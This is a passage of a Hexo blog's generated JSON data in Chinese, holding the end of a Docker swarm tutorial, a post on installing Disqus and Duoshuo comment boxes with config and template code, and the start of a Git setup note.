80。）</li>\n<li>使用默认设置定义<code>webnet</code>网络（此为负载均衡的<code>overlay</code>网络）。</li>\n</ul>\n<h3 id=\"运行新的负载均衡-load-balanced-的应用\"><a href=\"#运行新的负载均衡-load-balanced-的应用\" class=\"headerlink\" title=\"运行新的负载均衡(load-balanced)的应用\"></a>运行新的负载均衡(load-balanced)的应用</h3><p><strong>需要先运行以下命令，然后才能使用<code>docker stack deploy</code>命令：</strong><br><figure class=\"highlight bash\"><table><tr><td class=\"gutter\"><pre><span class=\"line\">1</span><br></pre></td><td class=\"code\"><pre><span class=\"line\">docker swarm init</span><br></pre></td></tr></table></figure></p>\n<p><strong>现在，运行此命令。您必须为应用指定一个名称。在此处该名称设置为<code>getstartedlab</code>：</strong><br><figure class=\"highlight bash\"><table><tr><td class=\"gutter\"><pre><span class=\"line\">1</span><br></pre></td><td class=\"code\"><pre><span class=\"line\">docker stack deploy -c docker-compose.yml getstartedlab</span><br></pre></td></tr></table></figure></p>\n<p><strong>查看您刚才启动的五个容器的列表：</strong><br><figure class=\"highlight bash\"><table><tr><td class=\"gutter\"><pre><span class=\"line\">1</span><br></pre></td><td class=\"code\"><pre><span class=\"line\">docker stack ps getstartedlab</span><br></pre></td></tr></table></figure></p>\n<p><img src=\"/images/docker1.png\" alt=\"\"></p>\n<p><strong>您可以多次在一行中运行<code>curl http://localhost</code>，也可以在浏览器中转至该 URL 并多次点击“刷新”。无论采用哪种方式，您都将看到容器 ID 更改，从而说明负载均衡；借助每项请求，将以循环方式选择五个从节点之一做出响应。</strong></p>\n<blockquote>\n<p><strong>注：在此阶段，容器最多可能需要 30 秒来响应 HTTP 请求。这并不代表 Docker 或 swarm 的性能，而是一项未满足的 Redis 依赖关系，我们稍后将在本教程中讨论此依赖关系。</strong></p>\n</blockquote>\n<h3 id=\"扩展应用\"><a href=\"#扩展应用\" class=\"headerlink\" title=\"扩展应用\"></a>扩展应用</h3><p><strong>您可以通过在<code>docker-compose.yml</code>中更改<code>replicas</code>值，保存更改并重新运行<code>docker stack deploy</code>命令来扩展应用：</strong><br><figure class=\"highlight bash\"><table><tr><td class=\"gutter\"><pre><span class=\"line\">1</span><br></pre></td><td class=\"code\"><pre><span class=\"line\">docker stack deploy -c docker-compose.yml getstartedlab</span><br></pre></td></tr></table></figure></p>\n<p><strong>Docker 将执行原地更新，而无需先清除技术栈或终止任何容器。</strong><br><strong>现在，重新运行<code>docker stack ps</code>命令以查看经过重新配置的已部署实例。例如，如果您扩展了从节点，将有更多处于运行状态的容器。</strong></p>\n<h3 id=\"清除应用和-swarm\"><a href=\"#清除应用和-swarm\" class=\"headerlink\" title=\"清除应用和 swarm\"></a>清除应用和 swarm</h3><p><strong>使用<code>docker stack rm</code>清除应用：</strong><br><figure class=\"highlight bash\"><table><tr><td class=\"gutter\"><pre><span class=\"line\">1</span><br></pre></td><td class=\"code\"><pre><span class=\"line\">docker stack rm getstartedlab</span><br></pre></td></tr></table></figure></p>\n<p><strong>这将删除应用，但我们的单节点<code>swarm</code>仍处于正常运行状态（如<code>docker node ls</code>所示）。使用<code>docker swarm leave --force</code>清除 swarm。</strong></p>\n<h3 id=\"速查表-1\"><a href=\"#速查表-1\" class=\"headerlink\" title=\"速查表\"></a>速查表</h3><figure class=\"highlight bash\"><table><tr><td class=\"gutter\"><pre><span class=\"line\">1</span><br><span class=\"line\">2</span><br><span class=\"line\">3</span><br><span class=\"line\">4</span><br><span class=\"line\">5</span><br></pre></td><td class=\"code\"><pre><span class=\"line\">docker stack ls              <span class=\"comment\"># 列出此 Docker 主机上所有正在运行的应用</span></span><br><span class=\"line\">docker stack deploy -c &lt;composefile&gt; &lt;appname&gt;  <span class=\"comment\"># 运行指定的 Compose 文件</span></span><br><span class=\"line\">docker stack services &lt;appname&gt;       <span class=\"comment\"># 列出与应用关联的服务</span></span><br><span class=\"line\">docker stack ps &lt;appname&gt;   <span class=\"comment\"># 列出与应用关联的正在运行的容器</span></span><br><span class=\"line\">docker stack rm &lt;appname&gt;                             <span class=\"comment\"># 清除应用</span></span><br></pre></td></tr></table></figure>\n<h2 id=\"Swarm\"><a href=\"#Swarm\" class=\"headerlink\" title=\"Swarm\"></a>Swarm</h2><p>引用<a href=\"https://docs.docker-cn.com/get-started/part4/\">Docker中文文档 Swarm</a></p>\n<h2 id=\"技术栈\"><a href=\"#技术栈\" class=\"headerlink\" title=\"技术栈\"></a>技术栈</h2><p>引用<a href=\"https://docs.docker-cn.com/get-started/part5/\">Docker中文文档 技术栈</a></p>\n<h2 id=\"引用链接\"><a href=\"#引用链接\" class=\"headerlink\" title=\"引用链接\"></a>引用链接</h2><ul>\n<li><a href=\"https://www.docker-cn.com/what-docker\">Docker中文</a></li>\n<li><a href=\"https://docs.docker.com/engine/installation/linux/docker-ce/centos/\">Get Docker CE for CentOS</a></li>\n<li><a href=\"https://docs.docker.com/get-started/\">Docker官网文档</a></li>\n<li><a href=\"https://docs.docker-cn.com/get-started/part3/\">Docker 服务</a></li>\n</ul>"},{"title":"hexo评论框部署","date":"2016-05-22T16:00:00.000Z","_content":"这几天我被一个问题缠了很久，一直没解决，到现在算是有点清楚了，所以来写个博文记录一下。hexo本身是有默认的评论框的disqus，个人感觉这个评论框风格很好，其实我想用来着，不过想想国内要翻墙，很麻烦，所以很委屈的选择了多说，不是说多说不好，自己个人比较喜欢disqus。废话不多说，来看看我折腾的过程吧。\n\n<!--more-->\n\n#### 配置disqus评论框\n我强烈推荐有条件的人选择disqus，而且由于是默认的评论框，很简单，你先去注册一个disqus账号，然后获取你的disqus_shortname,接着你要找到你的博客主目录下的_config.yml文件，这个文件是设置你的整个博客的配置的。然后找到如下代码\n\n``` bash\n# Extensions\n## Plugins: https://hexo.io/plugins/\n## Themes: https://hexo.io/themes/\ntheme: landscape\n\n# Deployment\n## Docs: https://hexo.io/docs/deployment.html\ndeploy:\n```\n\n在theme： landscape下面添加如下代码\n\n``` bash\n# Disqus\ndisqus_shortname: your short_name\n```\n\n然后保存就可以了，如果不行，在网上搜一下吧，反正我的是可以的\n\n#### 配置duoshuo评论框\n这个可能对于一点没接触过html，javascript和markdown的人来说是很痛苦的事情，因为你看不懂代码，然后网上有些博主写得很简洁，就看不懂了，我也是，所以我就一直抱着看呀看，看呀看，觉果懂了那么一点。\n首先也是要去多说网站注册一个账号，然后获取你的short_name,然后还是在上面说的那个文件中将刚刚要插入的代码改成\n\n``` bash\n# Duoshuo\nduoshuo_shortname: your short_name\n```\n\n然后找到这个文件：themes/你的博客所用主题/layout/_partial/article.ejs, 打开它。然后你可以疯了，因为当时我很难看懂里面代码什么意思，不过别放弃，慢慢找代码，找到\n\n``` bash\n<footer>\n....\n....\n</footer>\n```\n这个小框架，然后不管你看到了什么，都把它改成下列代码\n\n``` bash\n<footer class=\"article-footer\">\n      <a data-url=\"<%- post.permalink %>\" data-id=\"<%= post._id %>\" class=\"article-share-link\"><%= __('share') %></a>\n      <% if (post.comments && theme.duoshuo_shortname){ %>\n        <a href=\"<%- post.permalink %>#disqus_thread\" class=\"article-comment-link\"><%= __('comment') %></a>\n      <% } %>\n      <%- partial('post/tag') %>\n    </footer>\n```\n\n然后在这个文件最后将你在多说网站上获取的代码复制粘贴好，不过没完，你需要完善，完善什么呢，你会看到其中有些值需要你去填写。这个过程可以在网上找一下，因为看不懂，如果你自己打代码，会出现一些小细节的语法错误，最后完善了就像下面一样\n\n``` bash\n<% if (!index && post.comments && theme.duoshuo_shortname){ %>\n<section id=\"comment\">\n<div class=\"ds-thread\" data-thread-key=<%= page.path %> data-title=<%= page.title %> data-url=<%= page.permalink %>></div>\n<!-- 多说评论框 end -->\n<!-- 多说公共JS代码 start (一个网页只需插入一次) -->\n<script type=\"text/javascript\">\nvar duoshuoQuery = {short_name:\"your shortnsme\"};\n\t(function() {\n\t\tvar ds = document.createElement('script');\n\t\tds.type = 'text/javascript';ds.async = true;\n\t\tds.src = (document.location.protocol == 'https:' ? 'https:' : 'http:') + '//static.duoshuo.com/embed.js';\n\t\tds.charset = 'UTF-8';\n\t\t(document.getElementsByTagName('head')[0]\n\t\t || document.getElementsByTagName('body')[0]).appendChild(ds);\n\t})();\n\t</script>\n    </section>\n    <%}%>\n```\n\n随便解释一下，第一行是条件语句，大概意思是主页上的文章不显示评论，要点击评论后才显示评论，接下来的代码就是评论框的实现方法。修改完了，现在可以保存了，然后部署到你的github page上，如果你能看到效果，没有什么问题，那么恭喜你，你太幸运了。反正对于一开始连代码都看不懂的我来说出现了好多问题，现在想来都觉得，明明很简单的事情，我却踩了好多坑。\n\n#### 附文\n之前说的那个comment小bug让我知道了另外一个东西，就是每篇博文下的comment,share是怎么实现的。下附网址：\nhttps://astronautweb.co/snippet/font-awesome/\n怎么使用别问我，自己慢慢摸索吧，着个人感觉是个好东西。\n","source":"_posts/duoshuo.md","raw":"---\ntitle: hexo评论框部署\ndate: 2016-05-23\ncategories: hexo\ntags:\n  - disqus\n  - duoshuo\n---\n这几天我被一个问题缠了很久，一直没解决，到现在算是有点清楚了，所以来写个博文记录一下。hexo本身是有默认的评论框的disqus，个人感觉这个评论框风格很好，其实我想用来着，不过想想国内要翻墙，很麻烦，所以很委屈的选择了多说，不是说多说不好，自己个人比较喜欢disqus。废话不多说，来看看我折腾的过程吧。\n\n<!--more-->\n\n#### 配置disqus评论框\n我强烈推荐有条件的人选择disqus，而且由于是默认的评论框，很简单，你先去注册一个disqus账号，然后获取你的disqus_shortname,接着你要找到你的博客主目录下的_config.yml文件，这个文件是设置你的整个博客的配置的。然后找到如下代码\n\n``` bash\n# Extensions\n## Plugins: https://hexo.io/plugins/\n## Themes: https://hexo.io/themes/\ntheme: landscape\n\n# Deployment\n## Docs: https://hexo.io/docs/deployment.html\ndeploy:\n```\n\n在theme： landscape下面添加如下代码\n\n``` bash\n# Disqus\ndisqus_shortname: your short_name\n```\n\n然后保存就可以了，如果不行，在网上搜一下吧，反正我的是可以的\n\n#### 配置duoshuo评论框\n这个可能对于一点没接触过html，javascript和markdown的人来说是很痛苦的事情，因为你看不懂代码，然后网上有些博主写得很简洁，就看不懂了，我也是，所以我就一直抱着看呀看，看呀看，觉果懂了那么一点。\n首先也是要去多说网站注册一个账号，然后获取你的short_name,然后还是在上面说的那个文件中将刚刚要插入的代码改成\n\n``` bash\n# Duoshuo\nduoshuo_shortname: your short_name\n```\n\n然后找到这个文件：themes/你的博客所用主题/layout/_partial/article.ejs, 打开它。然后你可以疯了，因为当时我很难看懂里面代码什么意思，不过别放弃，慢慢找代码，找到\n\n``` bash\n<footer>\n....\n....\n</footer>\n```\n这个小框架，然后不管你看到了什么，都把它改成下列代码\n\n``` bash\n<footer class=\"article-footer\">\n      <a data-url=\"<%- post.permalink %>\" data-id=\"<%= post._id %>\" class=\"article-share-link\"><%= __('share') %></a>\n      <% if (post.comments && theme.duoshuo_shortname){ %>\n        <a href=\"<%- post.permalink %>#disqus_thread\" class=\"article-comment-link\"><%= __('comment') %></a>\n      <% } %>\n      <%- partial('post/tag') %>\n    </footer>\n```\n\n然后在这个文件最后将你在多说网站上获取的代码复制粘贴好，不过没完，你需要完善，完善什么呢，你会看到其中有些值需要你去填写。这个过程可以在网上找一下，因为看不懂，如果你自己打代码，会出现一些小细节的语法错误，最后完善了就像下面一样\n\n``` bash\n<% if (!index && post.comments && theme.duoshuo_shortname){ %>\n<section id=\"comment\">\n<div class=\"ds-thread\" data-thread-key=<%= page.path %> data-title=<%= page.title %> data-url=<%= page.permalink %>></div>\n<!-- 多说评论框 end -->\n<!-- 多说公共JS代码 start (一个网页只需插入一次) -->\n<script type=\"text/javascript\">\nvar duoshuoQuery = {short_name:\"your shortnsme\"};\n\t(function() {\n\t\tvar ds = document.createElement('script');\n\t\tds.type = 'text/javascript';ds.async = true;\n\t\tds.src = (document.location.protocol == 'https:' ? 'https:' : 'http:') + '//static.duoshuo.com/embed.js';\n\t\tds.charset = 'UTF-8';\n\t\t(document.getElementsByTagName('head')[0]\n\t\t || document.getElementsByTagName('body')[0]).appendChild(ds);\n\t})();\n\t</script>\n    </section>\n    <%}%>\n```\n\n随便解释一下，第一行是条件语句，大概意思是主页上的文章不显示评论，要点击评论后才显示评论，接下来的代码就是评论框的实现方法。修改完了，现在可以保存了，然后部署到你的github page上，如果你能看到效果，没有什么问题，那么恭喜你，你太幸运了。反正对于一开始连代码都看不懂的我来说出现了好多问题，现在想来都觉得，明明很简单的事情，我却踩了好多坑。\n\n#### 附文\n之前说的那个comment小bug让我知道了另外一个东西，就是每篇博文下的comment,share是怎么实现的。下附网址：\nhttps://astronautweb.co/snippet/font-awesome/\n怎么使用别问我，自己慢慢摸索吧，着个人感觉是个好东西。\n","slug":"duoshuo","published":1,"updated":"2017-11-28T03:24:49.097Z","comments":1,"layout":"post","photos":[],"link":"","_id":"cjgrjscym001nyp0lh832oe1p","content":"<p>这几天我被一个问题缠了很久，一直没解决，到现在算是有点清楚了，所以来写个博文记录一下。hexo本身是有默认的评论框的disqus，个人感觉这个评论框风格很好，其实我想用来着，不过想想国内要翻墙，很麻烦，所以很委屈的选择了多说，不是说多说不好，自己个人比较喜欢disqus。废话不多说，来看看我折腾的过程吧。</p>\n<a id=\"more\"></a>\n<h4 id=\"配置disqus评论框\"><a href=\"#配置disqus评论框\" class=\"headerlink\" title=\"配置disqus评论框\"></a>配置disqus评论框</h4><p>我强烈推荐有条件的人选择disqus，而且由于是默认的评论框，很简单，你先去注册一个disqus账号，然后获取你的disqus_shortname,接着你要找到你的博客主目录下的_config.yml文件，这个文件是设置你的整个博客的配置的。然后找到如下代码</p>\n<figure class=\"highlight bash\"><table><tr><td class=\"gutter\"><pre><span class=\"line\">1</span><br><span class=\"line\">2</span><br><span class=\"line\">3</span><br><span class=\"line\">4</span><br><span class=\"line\">5</span><br><span class=\"line\">6</span><br><span class=\"line\">7</span><br><span class=\"line\">8</span><br></pre></td><td class=\"code\"><pre><span class=\"line\"><span class=\"comment\"># Extensions</span></span><br><span class=\"line\"><span class=\"comment\">## Plugins: https://hexo.io/plugins/</span></span><br><span class=\"line\"><span class=\"comment\">## Themes: https://hexo.io/themes/</span></span><br><span class=\"line\">theme: landscape</span><br><span class=\"line\"></span><br><span class=\"line\"><span class=\"comment\"># Deployment</span></span><br><span class=\"line\"><span class=\"comment\">## Docs: https://hexo.io/docs/deployment.html</span></span><br><span class=\"line\">deploy:</span><br></pre></td></tr></table></figure>\n<p>在theme： landscape下面添加如下代码</p>\n<figure class=\"highlight bash\"><table><tr><td class=\"gutter\"><pre><span class=\"line\">1</span><br><span class=\"line\">2</span><br></pre></td><td class=\"code\"><pre><span class=\"line\"><span class=\"comment\"># Disqus</span></span><br><span class=\"line\">disqus_shortname: your short_name</span><br></pre></td></tr></table></figure>\n<p>然后保存就可以了，如果不行，在网上搜一下吧，反正我的是可以的</p>\n<h4 id=\"配置duoshuo评论框\"><a href=\"#配置duoshuo评论框\" class=\"headerlink\" title=\"配置duoshuo评论框\"></a>配置duoshuo评论框</h4><p>这个可能对于一点没接触过html，javascript和markdown的人来说是很痛苦的事情，因为你看不懂代码，然后网上有些博主写得很简洁，就看不懂了，我也是，所以我就一直抱着看呀看，看呀看，觉果懂了那么一点。<br>首先也是要去多说网站注册一个账号，然后获取你的short_name,然后还是在上面说的那个文件中将刚刚要插入的代码改成</p>\n<figure class=\"highlight bash\"><table><tr><td class=\"gutter\"><pre><span class=\"line\">1</span><br><span class=\"line\">2</span><br></pre></td><td class=\"code\"><pre><span class=\"line\"><span class=\"comment\"># Duoshuo</span></span><br><span class=\"line\">duoshuo_shortname: your short_name</span><br></pre></td></tr></table></figure>\n<p>然后找到这个文件：themes/你的博客所用主题/layout/_partial/article.ejs, 打开它。然后你可以疯了，因为当时我很难看懂里面代码什么意思，不过别放弃，慢慢找代码，找到</p>\n<figure class=\"highlight bash\"><table><tr><td class=\"gutter\"><pre><span class=\"line\">1</span><br><span class=\"line\">2</span><br><span class=\"line\">3</span><br><span class=\"line\">4</span><br></pre></td><td class=\"code\"><pre><span class=\"line\">&lt;footer&gt;</span><br><span class=\"line\">....</span><br><span class=\"line\">....</span><br><span class=\"line\">&lt;/footer&gt;</span><br></pre></td></tr></table></figure>\n<p>这个小框架，然后不管你看到了什么，都把它改成下列代码</p>\n<figure class=\"highlight bash\"><table><tr><td class=\"gutter\"><pre><span class=\"line\">1</span><br><span class=\"line\">2</span><br><span class=\"line\">3</span><br><span class=\"line\">4</span><br><span class=\"line\">5</span><br><span class=\"line\">6</span><br><span class=\"line\">7</span><br></pre></td><td class=\"code\"><pre><span class=\"line\">&lt;footer class=<span class=\"string\">\"article-footer\"</span>&gt;</span><br><span class=\"line\">      &lt;a data-url=<span class=\"string\">\"&lt;%- post.permalink %&gt;\"</span> data-id=<span class=\"string\">\"&lt;%= post._id %&gt;\"</span> class=<span class=\"string\">\"article-share-link\"</span>&gt;&lt;%= __(<span class=\"string\">'share'</span>) %&gt;&lt;/a&gt;</span><br><span class=\"line\">      &lt;% <span class=\"keyword\">if</span> (post.comments &amp;&amp; theme.duoshuo_shortname)&#123; %&gt;</span><br><span class=\"line\">        &lt;a href=<span class=\"string\">\"&lt;%- post.permalink %&gt;#disqus_thread\"</span> class=<span class=\"string\">\"article-comment-link\"</span>&gt;&lt;%= __(<span class=\"string\">'comment'</span>) %&gt;&lt;/a&gt;</span><br><span class=\"line\">      &lt;% &#125; %&gt;</span><br><span class=\"line\">      &lt;%- partial(<span class=\"string\">'post/tag'</span>) %&gt;</span><br><span class=\"line\">    &lt;/footer&gt;</span><br></pre></td></tr></table></figure>\n<p>然后在这个文件最后将你在多说网站上获取的代码复制粘贴好，不过没完，你需要完善，完善什么呢，你会看到其中有些值需要你去填写。这个过程可以在网上找一下，因为看不懂，如果你自己打代码，会出现一些小细节的语法错误，最后完善了就像下面一样</p>\n<figure class=\"highlight bash\"><table><tr><td class=\"gutter\"><pre><span class=\"line\">1</span><br><span class=\"line\">2</span><br><span class=\"line\">3</span><br><span class=\"line\">4</span><br><span class=\"line\">5</span><br><span class=\"line\">6</span><br><span class=\"line\">7</span><br><span class=\"line\">8</span><br><span class=\"line\">9</span><br><span class=\"line\">10</span><br><span class=\"line\">11</span><br><span class=\"line\">12</span><br><span class=\"line\">13</span><br><span class=\"line\">14</span><br><span class=\"line\">15</span><br><span class=\"line\">16</span><br><span class=\"line\">17</span><br><span class=\"line\">18</span><br></pre></td><td class=\"code\"><pre><span class=\"line\">&lt;% <span class=\"keyword\">if</span> (!index &amp;&amp; post.comments &amp;&amp; theme.duoshuo_shortname)&#123; %&gt;</span><br><span class=\"line\">&lt;section id=<span class=\"string\">\"comment\"</span>&gt;</span><br><span class=\"line\">&lt;div class=<span class=\"string\">\"ds-thread\"</span> data-thread-key=&lt;%= page.path %&gt; data-title=&lt;%= page.title %&gt; data-url=&lt;%= page.permalink %&gt;&gt;&lt;/div&gt;</span><br><span class=\"line\">&lt;!-- 多说评论框 end --&gt;</span><br><span class=\"line\">&lt;!-- 多说公共JS代码 start (一个网页只需插入一次) --&gt;</span><br><span class=\"line\">&lt;script <span class=\"built_in\">type</span>=<span class=\"string\">\"text/javascript\"</span>&gt;</span><br><span class=\"line\">var duoshuoQuery = &#123;short_name:<span class=\"string\">\"your shortnsme\"</span>&#125;;</span><br><span class=\"line\">\t(<span class=\"function\"><span class=\"title\">function</span></span>() &#123;</span><br><span class=\"line\">\t\tvar ds = document.createElement(<span class=\"string\">'script'</span>);</span><br><span class=\"line\">\t\tds.type = <span class=\"string\">'text/javascript'</span>;ds.async = <span class=\"literal\">true</span>;</span><br><span class=\"line\">\t\tds.src = (document.location.protocol == <span class=\"string\">'https:'</span> ? <span class=\"string\">'https:'</span> : <span class=\"string\">'http:'</span>) + <span class=\"string\">'//static.duoshuo.com/embed.js'</span>;</span><br><span class=\"line\">\t\tds.charset = <span class=\"string\">'UTF-8'</span>;</span><br><span class=\"line\">\t\t(document.getElementsByTagName(<span class=\"string\">'head'</span>)[0]</span><br><span class=\"line\">\t\t || document.getElementsByTagName(<span class=\"string\">'body'</span>)[0]).appendChild(ds);</span><br><span class=\"line\">\t&#125;)();</span><br><span class=\"line\">\t&lt;/script&gt;</span><br><span class=\"line\">    &lt;/section&gt;</span><br><span class=\"line\">    &lt;%&#125;%&gt;</span><br></pre></td></tr></table></figure>\n<p>随便解释一下，第一行是条件语句，大概意思是主页上的文章不显示评论，要点击评论后才显示评论，接下来的代码就是评论框的实现方法。修改完了，现在可以保存了，然后部署到你的github page上，如果你能看到效果，没有什么问题，那么恭喜你，你太幸运了。反正对于一开始连代码都看不懂的我来说出现了好多问题，现在想来都觉得，明明很简单的事情，我却踩了好多坑。</p>\n<h4 id=\"附文\"><a href=\"#附文\" class=\"headerlink\" title=\"附文\"></a>附文</h4><p>之前说的那个comment小bug让我知道了另外一个东西，就是每篇博文下的comment,share是怎么实现的。下附网址：<br><a href=\"https://astronautweb.co/snippet/font-awesome/\" target=\"_blank\" rel=\"external\">https://astronautweb.co/snippet/font-awesome/</a><br>怎么使用别问我，自己慢慢摸索吧，着个人感觉是个好东西。</p>\n","excerpt":"<p>这几天我被一个问题缠了很久，一直没解决，到现在算是有点清楚了，所以来写个博文记录一下。hexo本身是有默认的评论框的disqus，个人感觉这个评论框风格很好，其实我想用来着，不过想想国内要翻墙，很麻烦，所以很委屈的选择了多说，不是说多说不好，自己个人比较喜欢disqus。废话不多说，来看看我折腾的过程吧。</p>","more":"<h4 id=\"配置disqus评论框\"><a href=\"#配置disqus评论框\" class=\"headerlink\" title=\"配置disqus评论框\"></a>配置disqus评论框</h4><p>我强烈推荐有条件的人选择disqus，而且由于是默认的评论框，很简单，你先去注册一个disqus账号，然后获取你的disqus_shortname,接着你要找到你的博客主目录下的_config.yml文件，这个文件是设置你的整个博客的配置的。然后找到如下代码</p>\n<figure class=\"highlight bash\"><table><tr><td class=\"gutter\"><pre><span class=\"line\">1</span><br><span class=\"line\">2</span><br><span class=\"line\">3</span><br><span class=\"line\">4</span><br><span class=\"line\">5</span><br><span class=\"line\">6</span><br><span class=\"line\">7</span><br><span class=\"line\">8</span><br></pre></td><td class=\"code\"><pre><span class=\"line\"><span class=\"comment\"># Extensions</span></span><br><span class=\"line\"><span class=\"comment\">## Plugins: https://hexo.io/plugins/</span></span><br><span class=\"line\"><span class=\"comment\">## Themes: https://hexo.io/themes/</span></span><br><span class=\"line\">theme: landscape</span><br><span class=\"line\"></span><br><span class=\"line\"><span class=\"comment\"># Deployment</span></span><br><span class=\"line\"><span class=\"comment\">## Docs: https://hexo.io/docs/deployment.html</span></span><br><span class=\"line\">deploy:</span><br></pre></td></tr></table></figure>\n<p>在theme： landscape下面添加如下代码</p>\n<figure class=\"highlight bash\"><table><tr><td class=\"gutter\"><pre><span class=\"line\">1</span><br><span class=\"line\">2</span><br></pre></td><td class=\"code\"><pre><span class=\"line\"><span class=\"comment\"># Disqus</span></span><br><span class=\"line\">disqus_shortname: your short_name</span><br></pre></td></tr></table></figure>\n<p>然后保存就可以了，如果不行，在网上搜一下吧，反正我的是可以的</p>\n<h4 id=\"配置duoshuo评论框\"><a href=\"#配置duoshuo评论框\" class=\"headerlink\" title=\"配置duoshuo评论框\"></a>配置duoshuo评论框</h4><p>这个可能对于一点没接触过html，javascript和markdown的人来说是很痛苦的事情，因为你看不懂代码，然后网上有些博主写得很简洁，就看不懂了，我也是，所以我就一直抱着看呀看，看呀看，觉果懂了那么一点。<br>首先也是要去多说网站注册一个账号，然后获取你的short_name,然后还是在上面说的那个文件中将刚刚要插入的代码改成</p>\n<figure class=\"highlight bash\"><table><tr><td class=\"gutter\"><pre><span class=\"line\">1</span><br><span class=\"line\">2</span><br></pre></td><td class=\"code\"><pre><span class=\"line\"><span class=\"comment\"># Duoshuo</span></span><br><span class=\"line\">duoshuo_shortname: your short_name</span><br></pre></td></tr></table></figure>\n<p>然后找到这个文件：themes/你的博客所用主题/layout/_partial/article.ejs, 打开它。然后你可以疯了，因为当时我很难看懂里面代码什么意思，不过别放弃，慢慢找代码，找到</p>\n<figure class=\"highlight bash\"><table><tr><td class=\"gutter\"><pre><span class=\"line\">1</span><br><span class=\"line\">2</span><br><span class=\"line\">3</span><br><span class=\"line\">4</span><br></pre></td><td class=\"code\"><pre><span class=\"line\">&lt;footer&gt;</span><br><span class=\"line\">....</span><br><span class=\"line\">....</span><br><span class=\"line\">&lt;/footer&gt;</span><br></pre></td></tr></table></figure>\n<p>这个小框架，然后不管你看到了什么，都把它改成下列代码</p>\n<figure class=\"highlight bash\"><table><tr><td class=\"gutter\"><pre><span class=\"line\">1</span><br><span class=\"line\">2</span><br><span class=\"line\">3</span><br><span class=\"line\">4</span><br><span class=\"line\">5</span><br><span class=\"line\">6</span><br><span class=\"line\">7</span><br></pre></td><td class=\"code\"><pre><span class=\"line\">&lt;footer class=<span class=\"string\">\"article-footer\"</span>&gt;</span><br><span class=\"line\">      &lt;a data-url=<span class=\"string\">\"&lt;%- post.permalink %&gt;\"</span> data-id=<span class=\"string\">\"&lt;%= post._id %&gt;\"</span> class=<span class=\"string\">\"article-share-link\"</span>&gt;&lt;%= __(<span class=\"string\">'share'</span>) %&gt;&lt;/a&gt;</span><br><span class=\"line\">      &lt;% <span class=\"keyword\">if</span> (post.comments &amp;&amp; theme.duoshuo_shortname)&#123; %&gt;</span><br><span class=\"line\">        &lt;a href=<span class=\"string\">\"&lt;%- post.permalink %&gt;#disqus_thread\"</span> class=<span class=\"string\">\"article-comment-link\"</span>&gt;&lt;%= __(<span class=\"string\">'comment'</span>) %&gt;&lt;/a&gt;</span><br><span class=\"line\">      &lt;% &#125; %&gt;</span><br><span class=\"line\">      &lt;%- partial(<span class=\"string\">'post/tag'</span>) %&gt;</span><br><span class=\"line\">    &lt;/footer&gt;</span><br></pre></td></tr></table></figure>\n<p>然后在这个文件最后将你在多说网站上获取的代码复制粘贴好，不过没完，你需要完善，完善什么呢，你会看到其中有些值需要你去填写。这个过程可以在网上找一下，因为看不懂，如果你自己打代码，会出现一些小细节的语法错误，最后完善了就像下面一样</p>\n<figure class=\"highlight bash\"><table><tr><td class=\"gutter\"><pre><span class=\"line\">1</span><br><span class=\"line\">2</span><br><span class=\"line\">3</span><br><span class=\"line\">4</span><br><span class=\"line\">5</span><br><span class=\"line\">6</span><br><span class=\"line\">7</span><br><span class=\"line\">8</span><br><span class=\"line\">9</span><br><span class=\"line\">10</span><br><span class=\"line\">11</span><br><span class=\"line\">12</span><br><span class=\"line\">13</span><br><span class=\"line\">14</span><br><span class=\"line\">15</span><br><span class=\"line\">16</span><br><span class=\"line\">17</span><br><span class=\"line\">18</span><br></pre></td><td class=\"code\"><pre><span class=\"line\">&lt;% <span class=\"keyword\">if</span> (!index &amp;&amp; post.comments &amp;&amp; theme.duoshuo_shortname)&#123; %&gt;</span><br><span class=\"line\">&lt;section id=<span class=\"string\">\"comment\"</span>&gt;</span><br><span class=\"line\">&lt;div class=<span class=\"string\">\"ds-thread\"</span> data-thread-key=&lt;%= page.path %&gt; data-title=&lt;%= page.title %&gt; data-url=&lt;%= page.permalink %&gt;&gt;&lt;/div&gt;</span><br><span class=\"line\">&lt;!-- 多说评论框 end --&gt;</span><br><span class=\"line\">&lt;!-- 多说公共JS代码 start (一个网页只需插入一次) --&gt;</span><br><span class=\"line\">&lt;script <span class=\"built_in\">type</span>=<span class=\"string\">\"text/javascript\"</span>&gt;</span><br><span class=\"line\">var duoshuoQuery = &#123;short_name:<span class=\"string\">\"your shortnsme\"</span>&#125;;</span><br><span class=\"line\">\t(<span class=\"function\"><span class=\"title\">function</span></span>() &#123;</span><br><span class=\"line\">\t\tvar ds = document.createElement(<span class=\"string\">'script'</span>);</span><br><span class=\"line\">\t\tds.type = <span class=\"string\">'text/javascript'</span>;ds.async = <span class=\"literal\">true</span>;</span><br><span class=\"line\">\t\tds.src = (document.location.protocol == <span class=\"string\">'https:'</span> ? <span class=\"string\">'https:'</span> : <span class=\"string\">'http:'</span>) + <span class=\"string\">'//static.duoshuo.com/embed.js'</span>;</span><br><span class=\"line\">\t\tds.charset = <span class=\"string\">'UTF-8'</span>;</span><br><span class=\"line\">\t\t(document.getElementsByTagName(<span class=\"string\">'head'</span>)[0]</span><br><span class=\"line\">\t\t || document.getElementsByTagName(<span class=\"string\">'body'</span>)[0]).appendChild(ds);</span><br><span class=\"line\">\t&#125;)();</span><br><span class=\"line\">\t&lt;/script&gt;</span><br><span class=\"line\">    &lt;/section&gt;</span><br><span class=\"line\">    &lt;%&#125;%&gt;</span><br></pre></td></tr></table></figure>\n<p>随便解释一下，第一行是条件语句，大概意思是主页上的文章不显示评论，要点击评论后才显示评论，接下来的代码就是评论框的实现方法。修改完了，现在可以保存了，然后部署到你的github page上，如果你能看到效果，没有什么问题，那么恭喜你，你太幸运了。反正对于一开始连代码都看不懂的我来说出现了好多问题，现在想来都觉得，明明很简单的事情，我却踩了好多坑。</p>\n<h4 id=\"附文\"><a href=\"#附文\" class=\"headerlink\" title=\"附文\"></a>附文</h4><p>之前说的那个comment小bug让我知道了另外一个东西，就是每篇博文下的comment,share是怎么实现的。下附网址：<br><a href=\"https://astronautweb.co/snippet/font-awesome/\">https://astronautweb.co/snippet/font-awesome/</a><br>怎么使用别问我，自己慢慢摸索吧，着个人感觉是个好东西。</p>"},{"title":"Git install and setting","date":"2016-05-21T07:18:23.000Z","comments":1,"_content":"### git install and setting:\n\n``` bash\n$ git config --global user.name \"name\"\n$ git config --global user.email \"email\"\n$ git config --global color.ui auto\n```\n\n### and then create a new directory as tutorial\n\n``` bash\n$ mkdir tutorial\n$ cd tutorial\n$ git init\n```\n\n### then create a new file as text.txt\n\n``` bash\n$ git status\n$ git add text.txt\n$ git status\n$ git commit -m \"text\"\n$ 